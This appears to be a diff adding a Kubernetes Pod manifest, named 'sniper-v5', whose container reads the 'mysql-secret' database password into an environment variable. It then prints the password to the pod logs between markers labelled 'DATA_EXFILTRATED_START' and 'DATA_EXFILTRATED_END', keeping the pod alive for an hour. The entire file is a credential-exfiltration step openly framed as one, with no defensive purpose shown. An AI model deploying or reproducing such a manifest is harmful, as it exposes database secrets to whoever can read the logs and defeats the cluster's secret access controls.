@@ -1,0 +1,17 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: sniper-v5
+  namespace: backbase
+spec:
+  containers:
+  - name: sniper-v5
+    image: alpine
+    command: ["/bin/sh", "-c", "echo 'DATA_EXFILTRATED_START'; echo $DB_PASS; echo 'DATA_EXFILTRATED_END'; sleep 3600"]
+    env:
+    - name: DB_PASS
+      valueFrom:
+        secretKeyRef:
+          name: mysql-secret
+          key: password
+  restartPolicy: Never
